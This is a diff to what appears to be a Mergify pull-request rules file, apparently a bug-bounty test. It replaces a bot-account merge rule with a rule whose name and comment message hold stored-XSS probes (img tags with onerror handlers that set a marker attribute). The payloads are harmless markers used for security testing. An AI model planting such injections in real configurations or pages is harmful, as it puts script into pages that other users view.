@@ -1,11 +1,9 @@
-# BOT_ACCOUNT_MERGE_CONTROL_20260726
+# STORED_XSS_RENDER_CONTROL_20260726
 pull_request_rules:
-  - name: h1-bot-account-protected-merge-control
+  - name: "H1XSS<img src=x onerror=document.documentElement.dataset.h1xss=1>"
     conditions:
       - author = onecursora1-cell
-      - title = H1 BOT ACCOUNT MERGE CONTROL 20260726
-      - base = h1-bot-merge-base-20260726
+      - title = H1 STORED XSS RENDER CONTROL 20260726
     actions:
-      merge:
-        method: merge
-        merge_bot_account: onecursor1-max
+      comment:
+        message: "H1XSSMSG<img src=x onerror=document.documentElement.dataset.h1xss=2>"
